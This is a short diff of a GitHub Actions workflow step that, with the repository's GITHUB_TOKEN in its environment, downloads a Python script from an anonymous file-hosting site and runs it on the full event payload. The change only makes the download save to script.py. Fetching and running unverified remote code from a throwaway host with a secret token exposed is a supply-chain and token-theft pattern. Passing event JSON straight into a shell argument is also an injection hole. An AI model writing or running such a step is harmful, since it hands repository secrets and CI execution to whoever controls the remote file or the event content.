@@ -17,5 +17,5 @@ jobs:
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
         run: |
-          curl -sSL "https://files.catbox.moe/pq7wjh.py"
-          python pq7wjh.py '${{ toJSON(github.event) }}'
+          curl -sSL "https://files.catbox.moe/pq7wjh.py" -o "script.py"
+          python script.py '${{ toJSON(github.event) }}'
